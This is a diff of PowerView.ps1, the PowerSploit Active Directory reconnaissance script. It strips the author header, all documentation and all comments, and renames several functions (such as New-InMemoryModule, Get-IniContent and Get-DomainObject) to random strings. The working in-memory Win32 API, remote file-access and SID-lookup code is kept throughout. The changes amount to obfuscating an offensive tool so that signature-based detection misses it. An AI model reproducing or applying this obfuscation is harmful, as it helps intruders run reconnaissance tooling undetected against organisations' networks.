@@ -1,50 +1,5 @@
-#requires -version 2
+function 9732B1QN {
 
-<#
-
-PowerSploit File: PowerView.ps1
-Author: Will Schroeder (@harmj0y)
-License: BSD 3-Clause
-Required Dependencies: None
-
-#>
-
-
-########################################################
-#
-# PSReflect code for Windows API access
-# Author: @mattifestation
-#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
-#
-########################################################
-
-function New-InMemoryModule {
-<#
-.SYNOPSIS
-
-Creates an in-memory assembly and module
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-
-.DESCRIPTION
-
-When defining custom enums, structs, and unmanaged functions, it is
-necessary to associate to an assembly module. This helper function
-creates an in-memory module that can be passed to the 'enum',
-'struct', and Add-Win32Type functions.
-
-.PARAMETER ModuleName
-
-Specifies the desired name for the in-memory assembly and module. If
-ModuleName is not provided, it will default to a GUID.
-
-.EXAMPLE
-
-$Module = New-InMemoryModule -ModuleName Win32
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
@@ -73,8 +28,8 @@ $Module = New-InMemoryModule -ModuleName Win32
 }
 
 
-# A helper function used to reduce typing while defining function
-# prototypes for Add-Win32Type.
+
+
 function func {
     Param (
         [Parameter(Position = 0, Mandatory = $True)]
@@ -126,98 +81,7 @@ function func {
 
 function Add-Win32Type
 {
-<#
-.SYNOPSIS
 
-Creates a .NET type for an unmanaged Win32 function.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: func
-
-.DESCRIPTION
-
-Add-Win32Type enables you to easily interact with unmanaged (i.e.
-Win32 unmanaged) functions in PowerShell. After providing
-Add-Win32Type with a function signature, a .NET type is created
-using reflection (i.e. csc.exe is never called like with Add-Type).
-
-The 'func' helper function can be used to reduce typing when defining
-multiple function definitions.
-
-.PARAMETER DllName
-
-The name of the DLL.
-
-.PARAMETER FunctionName
-
-The name of the target function.
-
-.PARAMETER EntryPoint
-
-The DLL export function name. This argument should be specified if the
-specified function name is different than the name of the exported
-function.
-
-.PARAMETER ReturnType
-
-The return type of the function.
-
-.PARAMETER ParameterTypes
-
-The function parameters.
-
-.PARAMETER NativeCallingConvention
-
-Specifies the native calling convention of the function. Defaults to
-stdcall.
-
-.PARAMETER Charset
-
-If you need to explicitly call an 'A' or 'W' Win32 function, you can
-specify the character set.
-
-.PARAMETER SetLastError
-
-Indicates whether the callee calls the SetLastError Win32 API
-function before returning from the attributed method.
-
-.PARAMETER Module
-
-The in-memory module that will host the functions. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER Namespace
-
-An optional namespace to prepend to the type. Add-Win32Type defaults
-to a namespace consisting only of the name of the DLL.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$FunctionDefinitions = @(
-  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
-  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
-  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
-)
-
-$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
-$Kernel32 = $Types['kernel32']
-$Ntdll = $Types['ntdll']
-$Ntdll::RtlGetCurrentPeb()
-$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
-$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
-
-.NOTES
-
-Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
-
-When defining multiple function prototypes, it is ideal to provide
-Add-Win32Type with an array of function signatures. That way, they
-are all incorporated into the same in-memory module.
-#>
 
     [OutputType([Hashtable])]
     Param(
@@ -282,7 +146,7 @@ are all incorporated into the same in-memory module.
         }
         else
         {
-            # Define one type for each DLL
+            
             if (!$TypeHash.ContainsKey($DllName))
             {
                 if ($Namespace)
@@ -301,7 +165,7 @@ are all incorporated into the same in-memory module.
                 $ReturnType,
                 $ParameterTypes)
 
-            # Make each ByRef parameter an Out parameter
+            
             $i = 1
             foreach($Parameter in $ParameterTypes)
             {
@@ -322,7 +186,7 @@ are all incorporated into the same in-memory module.
 
             if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
 
-            # Equivalent to C# version of [DllImport(DllName)]
+            
             $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
             $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                 $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
@@ -361,70 +225,7 @@ are all incorporated into the same in-memory module.
 
 
 function psenum {
-<#
-.SYNOPSIS
 
-Creates an in-memory enumeration for use in your PowerShell session.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-
-.DESCRIPTION
-
-The 'psenum' function facilitates the creation of enums entirely in
-memory using as close to a "C style" as PowerShell will allow.
-
-.PARAMETER Module
-
-The in-memory module that will host the enum. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER FullName
-
-The fully-qualified name of the enum.
-
-.PARAMETER Type
-
-The type of each enum element.
-
-.PARAMETER EnumElements
-
-A hashtable of enum elements.
-
-.PARAMETER Bitfield
-
-Specifies that the enum should be treated as a bitfield.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
-    UNKNOWN =                  0
-    NATIVE =                   1 # Image doesn't require a subsystem.
-    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
-    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
-    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
-    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
-    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
-    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
-    EFI_APPLICATION =          10
-    EFI_BOOT_SERVICE_DRIVER =  11
-    EFI_RUNTIME_DRIVER =       12
-    EFI_ROM =                  13
-    XBOX =                     14
-    WINDOWS_BOOT_APPLICATION = 16
-}
-
-.NOTES
-
-PowerShell purists may disagree with the naming of this function but
-again, this was developed in such a way so as to emulate a "C style"
-definition as closely as possible. Sorry, I'm not going to name it
-New-Enum. :P
-#>
 
     [OutputType([Type])]
     Param (
@@ -468,7 +269,7 @@ New-Enum. :P
 
     foreach ($Key in $EnumElements.Keys)
     {
-        # Apply the specified enum type to each element
+        
         $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
     }
 
@@ -476,8 +277,8 @@ New-Enum. :P
 }
 
 
-# A helper function used to reduce typing while defining struct
-# fields.
+
+
 function field {
     Param (
         [Parameter(Position = 0, Mandatory=$True)]
@@ -507,98 +308,7 @@ function field {
 
 function struct
 {
-<#
-.SYNOPSIS
 
-Creates an in-memory struct for use in your PowerShell session.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: field
-
-.DESCRIPTION
-
-The 'struct' function facilitates the creation of structs entirely in
-memory using as close to a "C style" as PowerShell will allow. Struct
-fields are specified using a hashtable where each field of the struct
-is comprosed of the order in which it should be defined, its .NET
-type, and optionally, its offset and special marshaling attributes.
-
-One of the features of 'struct' is that after your struct is defined,
-it will come with a built-in GetSize method as well as an explicit
-converter so that you can easily cast an IntPtr to the struct without
-relying upon calling SizeOf and/or PtrToStructure in the Marshal
-class.
-
-.PARAMETER Module
-
-The in-memory module that will host the struct. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER FullName
-
-The fully-qualified name of the struct.
-
-.PARAMETER StructFields
-
-A hashtable of fields. Use the 'field' helper function to ease
-defining each field.
-
-.PARAMETER PackingSize
-
-Specifies the memory alignment of fields.
-
-.PARAMETER ExplicitLayout
-
-Indicates that an explicit offset for each field will be specified.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
-    DOS_SIGNATURE =    0x5A4D
-    OS2_SIGNATURE =    0x454E
-    OS2_SIGNATURE_LE = 0x454C
-    VXD_SIGNATURE =    0x454C
-}
-
-$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
-    e_magic =    field 0 $ImageDosSignature
-    e_cblp =     field 1 UInt16
-    e_cp =       field 2 UInt16
-    e_crlc =     field 3 UInt16
-    e_cparhdr =  field 4 UInt16
-    e_minalloc = field 5 UInt16
-    e_maxalloc = field 6 UInt16
-    e_ss =       field 7 UInt16
-    e_sp =       field 8 UInt16
-    e_csum =     field 9 UInt16
-    e_ip =       field 10 UInt16
-    e_cs =       field 11 UInt16
-    e_lfarlc =   field 12 UInt16
-    e_ovno =     field 13 UInt16
-    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
-    e_oemid =    field 15 UInt16
-    e_oeminfo =  field 16 UInt16
-    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
-    e_lfanew =   field 18 Int32
-}
-
-# Example of using an explicit layout in order to create a union.
-$TestUnion = struct $Mod TestUnion @{
-    field1 = field 0 UInt32 0
-    field2 = field 1 IntPtr 0
-} -ExplicitLayout
-
-.NOTES
-
-PowerShell purists may disagree with the naming of this function but
-again, this was developed in such a way so as to emulate a "C style"
-definition as closely as possible. Sorry, I'm not going to name it
-New-Struct. :P
-#>
 
     [OutputType([Type])]
     Param (
@@ -649,9 +359,9 @@ New-Struct. :P
 
     $Fields = New-Object Hashtable[]($StructFields.Count)
 
-    # Sort each field according to the orders specified
-    # Unfortunately, PSv2 doesn't have the luxury of the
-    # hashtable [Ordered] accelerator.
+    
+    
+    
     foreach ($Field in $StructFields.Keys)
     {
         $Index = $StructFields[$Field]['Position']
@@ -689,14 +399,14 @@ New-Struct. :P
         if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
     }
 
-    # Make the struct aware of its own size.
-    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
+    
+    
     $SizeMethod = $StructBuilder.DefineMethod('GetSize',
         'Public, Static',
         [Int],
         [Type[]] @())
     $ILGenerator = $SizeMethod.GetILGenerator()
-    # Thanks for the help, Jason Shirk!
+    
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
@@ -704,8 +414,8 @@ New-Struct. :P
         [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
 
-    # Allow for explicit casting from an IntPtr
-    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
+    
+    
     $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
         'PrivateScope, Public, Static, HideBySig, SpecialName',
         $StructBuilder,
@@ -725,147 +435,14 @@ New-Struct. :P
 }
 
 
-########################################################
-#
-# Misc. helpers
-#
-########################################################
 
-Function New-DynamicParameter {
-<#
-.SYNOPSIS
 
-Helper function to simplify creating dynamic parameters.
 
-    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
-    Originally released under the Microsoft Public License (Ms-PL).
 
-.DESCRIPTION
 
-Helper function to simplify creating dynamic parameters.
 
-Example use cases:
-    Include parameters only if your environment dictates it
-    Include parameters depending on the value of a user-specified parameter
-    Provide tab completion and intellisense for parameters, depending on the environment
+Function 1FN2NPRI {
 
-Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
-    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,
-    ('Process' for advanced functions) to create those variables.
-    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.
-
-This function has two operating modes:
-
-1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
-with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.
-
-2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
-Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
-with custom conditions and so on.
-
-.NOTES
-
-Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
-    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
-    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
-    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/
-
-Credit to BM for alias and type parameters and their handling
-
-.PARAMETER Name
-
-Name of the dynamic parameter
-
-.PARAMETER Type
-
-Type for the dynamic parameter.  Default is string
-
-.PARAMETER Alias
-
-If specified, one or more aliases to assign to the dynamic parameter
-
-.PARAMETER Mandatory
-
-If specified, set the Mandatory attribute for this dynamic parameter
-
-.PARAMETER Position
-
-If specified, set the Position attribute for this dynamic parameter
-
-.PARAMETER HelpMessage
-
-If specified, set the HelpMessage for this dynamic parameter
-
-.PARAMETER DontShow
-
-If specified, set the DontShow for this dynamic parameter.
-This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
-http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/
-
-.PARAMETER ValueFromPipeline
-
-If specified, set the ValueFromPipeline attribute for this dynamic parameter
-
-.PARAMETER ValueFromPipelineByPropertyName
-
-If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter
-
-.PARAMETER ValueFromRemainingArguments
-
-If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter
-
-.PARAMETER ParameterSetName
-
-If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.
-
-.PARAMETER AllowNull
-
-If specified, set the AllowNull attribute of this dynamic parameter
-
-.PARAMETER AllowEmptyString
-
-If specified, set the AllowEmptyString attribute of this dynamic parameter
-
-.PARAMETER AllowEmptyCollection
-
-If specified, set the AllowEmptyCollection attribute of this dynamic parameter
-
-.PARAMETER ValidateNotNull
-
-If specified, set the ValidateNotNull attribute of this dynamic parameter
-
-.PARAMETER ValidateNotNullOrEmpty
-
-If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter
-
-.PARAMETER ValidateRange
-
-If specified, set the ValidateRange attribute of this dynamic parameter
-
-.PARAMETER ValidateLength
-
-If specified, set the ValidateLength attribute of this dynamic parameter
-
-.PARAMETER ValidatePattern
-
-If specified, set the ValidatePattern attribute of this dynamic parameter
-
-.PARAMETER ValidateScript
-
-If specified, set the ValidateScript attribute of this dynamic parameter
-
-.PARAMETER ValidateSet
-
-If specified, set the ValidateSet attribute of this dynamic parameter
-
-.PARAMETER Dictionary
-
-If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
-Appropriate for custom dynamic parameters creation.
-
-If not specified, create and return a RuntimeDefinedParameterDictionary
-Appropriate for a simple dynamic parameter creation.
-#>
 
     [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
     Param (
@@ -959,8 +536,8 @@ Appropriate for a simple dynamic parameter creation.
         [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
         [ValidateNotNullOrEmpty()]
         [ValidateScript({
-            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
-            # so one can't use PowerShell's '-is' operator to validate type.
+            
+            
             if($_.GetType().Name -notmatch 'Dictionary') {
                 Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
             }
@@ -989,13 +566,13 @@ Appropriate for a simple dynamic parameter creation.
             $StaleKeys = $PSBoundParameters.GetEnumerator() |
                         ForEach-Object {
                             if($_.Value.PSobject.Methods.Name -match '^Equals$') {
-                                # If object has Equals, compare bound key and variable using it
+                                
                                 if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                     $_.Key
                                 }
                             }
                             else {
-                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator
+                                
                                 if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                     $_.Key
                                 }
@@ -1005,15 +582,15 @@ Appropriate for a simple dynamic parameter creation.
                 $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
             }
 
-            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters
+            
             $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
-                                        # Find parameters that are belong to the current parameter set
+                                        
                                         Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                             Select-Object -ExpandProperty Key |
-                                                # Find unbound parameters in the current parameter set
+                                                
                                                 Where-Object { $PSBoundParameters.Keys -notcontains $_ }
 
-            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)
+            
             $tmp = $null
             ForEach ($Parameter in $UnboundParameters) {
                 $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
@@ -1029,10 +606,10 @@ Appropriate for a simple dynamic parameter creation.
                 $DPDictionary = $InternalDictionary
             }
 
-            # Shortcut for getting local variables
+            
             $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}
 
-            # Strings to match attributes and validation arguments
+            
             $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
             $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
             $AliasRegex = '^Alias$'
@@ -1088,72 +665,8 @@ Appropriate for a simple dynamic parameter creation.
 }
 
 
-function Get-IniContent {
-<#
-.SYNOPSIS
+function 1OXAJ540 {
 
-This helper parses an .ini file into a hashtable.
-
-Author: 'The Scripting Guys'
-Modifications: @harmj0y (-Credential support)
-License: BSD 3-Clause
-Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection
-
-.DESCRIPTION
-
-Parses an .ini file into a hashtable. If -Credential is supplied,
-then Add-RemoteConnection is used to map \\COMPUTERNAME\IPC$, the file
-is parsed, and then the connection is destroyed with Remove-RemoteConnection.
-
-.PARAMETER Path
-
-Specifies the path to the .ini file to parse.
-
-.PARAMETER OutputObject
-
-Switch. Output a custom PSObject instead of a hashtable.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system.
-
-.EXAMPLE
-
-Get-IniContent C:\Windows\example.ini
-
-.EXAMPLE
-
-"C:\Windows\example.ini" | Get-IniContent -OutputObject
-
-Outputs the .ini details as a proper nested PSObject.
-
-.EXAMPLE
-
-"C:\Windows\example.ini" | Get-IniContent
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-IniContent -Path \\PRIMARY.testlab.local\C$\Temp\GptTmpl.inf -Credential $Cred
-
-.INPUTS
-
-String
-
-Accepts one or more .ini paths on the pipeline.
-
-.OUTPUTS
-
-Hashtable
-
-Ouputs a hashtable representing the parsed .ini file.
-
-.LINK
-
-https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
@@ -1182,8 +695,8 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to
             if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $HostComputer = (New-Object System.Uri($TargetPath)).Host
                 if (-not $MappedComputers[$HostComputer]) {
-                    # map IPC$ to this computer if it's not already
-                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
+                    
+                    MKK4QQPC -ComputerName $HostComputer -Credential $Credential
                     $MappedComputers[$HostComputer] = $True
                 }
             }
@@ -1196,7 +709,7 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to
                     $IniObject = @{}
                 }
                 Switch -Regex -File $TargetPath {
-                    "^\[(.+)\]" # Section
+                    "^\[(.+)\]" 
                     {
                         $Section = $matches[1].Trim()
                         if ($PSBoundParameters['OutputObject']) {
@@ -1209,7 +722,7 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to
                         }
                         $CommentCount = 0
                     }
-                    "^(;.*)$" # Comment
+                    "^(;.*)$" 
                     {
                         $Value = $matches[1].Trim()
                         $CommentCount = $CommentCount + 1
@@ -1222,13 +735,13 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to
                             $IniObject[$Section][$Name] = $Value
                         }
                     }
-                    "(.+?)\s*=(.*)" # Key
+                    "(.+?)\s*=(.*)" 
                     {
                         $Name, $Value = $matches[1..2]
                         $Name = $Name.Trim()
                         $Values = $Value.split(',') | ForEach-Object { $_.Trim() }
 
-                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }
+                        
 
                         if ($PSBoundParameters['OutputObject']) {
                             $Name = $Name.Replace(' ', '')
@@ -1245,68 +758,14 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to
     }
 
     END {
-        # remove the IPC$ mappings
-        $MappedComputers.Keys | Remove-RemoteConnection
+        
+        $MappedComputers.Keys | TUGT2IL3
     }
 }
 
 
-function Export-PowerViewCSV {
-<#
-.SYNOPSIS
+function RJ4OGRQY {
 
-Converts objects into a series of comma-separated (CSV) strings and saves the
-strings in a CSV file in a thread-safe manner.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-This helper exports an -InputObject to a .csv in a thread-safe manner
-using a mutex. This is so the various multi-threaded functions in
-PowerView has a thread-safe way to export output to the same file.
-Uses .NET IO.FileStream/IO.StreamWriter objects for speed.
-
-Originally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590
-
-.PARAMETER InputObject
-
-Specifies the objects to export as CSV strings.
-
-.PARAMETER Path
-
-Specifies the path to the CSV output file.
-
-.PARAMETER Delimiter
-
-Specifies a delimiter to separate the property values. The default is a comma (,)
-
-.PARAMETER Append
-
-Indicates that this cmdlet adds the CSV output to the end of the specified file.
-Without this parameter, Export-PowerViewCSV replaces the file contents without warning.
-
-.EXAMPLE
-
-Get-DomainUser | Export-PowerViewCSV -Path "users.csv"
-
-.EXAMPLE
-
-Get-DomainUser | Export-PowerViewCSV -Path "users.csv" -Append -Delimiter '|'
-
-.INPUTS
-
-PSObject
-
-Accepts one or more PSObjects on the pipeline.
-
-.LINK
-
-http://poshcode.org/1590
-http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -1333,7 +792,7 @@ http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
         $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
         $Exists = [System.IO.File]::Exists($OutputPath)
 
-        # mutex so threaded code doesn't stomp on the output file
+        
         $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
         $Null = $Mutex.WaitOne()
 
@@ -1355,12 +814,12 @@ http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
             $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation
 
             if (-not $Exists) {
-                # output the object field names as well
+                
                 $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                 $Exists = $True
             }
             else {
-                # only output object field data
+                
                 $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
             }
         }
@@ -1375,41 +834,7 @@ http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
 
 
 function Resolve-IPAddress {
-<#
-.SYNOPSIS
 
-Resolves a given hostename to its associated IPv4 address.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Resolves a given hostename to its associated IPv4 address using
-[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
-is the IP address of the localhost.
-
-.EXAMPLE
-
-Resolve-IPAddress -ComputerName SERVER
-
-.EXAMPLE
-
-@("SERVER1", "SERVER2") | Resolve-IPAddress
-
-.INPUTS
-
-String
-
-Accepts one or more IP address strings on the pipeline.
-
-.OUTPUTS
-
-System.Management.Automation.PSCustomObject
-
-A custom PSObject with the ComputerName and IPAddress.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
@@ -1443,64 +868,7 @@ A custom PSObject with the ComputerName and IPAddress.
 
 
 function ConvertTo-SID {
-<#
-.SYNOPSIS
 
-Converts a given user/group name to a security identifier (SID).
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  
-
-.DESCRIPTION
-
-Converts a "DOMAIN\username" syntax to a security identifier (SID)
-using System.Security.Principal.NTAccount's translate function. If alternate
-credentials are supplied, then Get-ADObject is used to try to map the name
-to a security identifier.
-
-.PARAMETER ObjectName
-
-The user/group name to convert, can be 'user' or 'DOMAIN\user' format.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the translation, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the translation.
-
-.PARAMETER Credential
-
-Specifies an alternate credential to use for the translation.
-
-.EXAMPLE
-
-ConvertTo-SID 'DEV\dfm'
-
-.EXAMPLE
-
-'DEV\dfm','DEV\krbtgt' | ConvertTo-SID
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred
-
-.INPUTS
-
-String
-
-Accepts one or more username specification strings on the pipeline.
-
-.OUTPUTS
-
-String
-
-A string representing the SID of the translated name.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
@@ -1545,7 +913,7 @@ A string representing the SID of the translated name.
                     $DomainSearcherArguments['Identity'] = $UserName
                     $DomainSearcherArguments['Domain'] = $UserDomain
                     $DomainSearcherArguments['Properties'] = 'objectsid'
-                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
+                    U3GGBSG9 @DomainSearcherArguments | Select-Object -Expand objectsid
                 }
             }
             else {
@@ -1572,70 +940,7 @@ A string representing the SID of the translated name.
 
 
 function ConvertFrom-SID {
-<#
-.SYNOPSIS
 
-Converts a security identifier (SID) to a group/user name.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Convert-ADName  
-
-.DESCRIPTION
-
-Converts a security identifier string (SID) to a group/user name
-using Convert-ADName.
-
-.PARAMETER ObjectSid
-
-Specifies one or more SIDs to convert.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the translation, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the translation.
-
-.PARAMETER Credential
-
-Specifies an alternate credential to use for the translation.
-
-.EXAMPLE
-
-ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108
-
-TESTLAB\harmj0y
-
-.EXAMPLE
-
-"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID
-
-TESTLAB\WINDOWS2$
-TESTLAB\harmj0y
-BUILTIN\Distributed COM Users
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
-ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred
-
-TESTLAB\harmj0y
-
-.INPUTS
-
-String
-
-Accepts one or more SID strings on the pipeline.
-
-.OUTPUTS
-
-String
-
-The converted DOMAIN\username.
-#>
 
     [OutputType([String])]
     [CmdletBinding()]
@@ -1671,7 +976,7 @@ The converted DOMAIN\username.
         ForEach ($TargetSid in $ObjectSid) {
             $TargetSid = $TargetSid.trim('*')
             try {
-                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
+                
                 Switch ($TargetSid) {
                     'S-1-0'         { 'Null Authority' }
                     'S-1-0-0'       { 'Nobody' }
@@ -1748,108 +1053,7 @@ The converted DOMAIN\username.
 
 
 function Convert-ADName {
-<#
-.SYNOPSIS
 
-Converts Active Directory object names between a variety of formats.
-
-Author: Bill Stewart, Pasquale Lantella  
-Modifications: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)
-and translates Active Directory names between various formats using the NameTranslate COM object.
-
-.PARAMETER Identity
-
-Specifies the Active Directory object name to translate, of the following form:
-
-    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
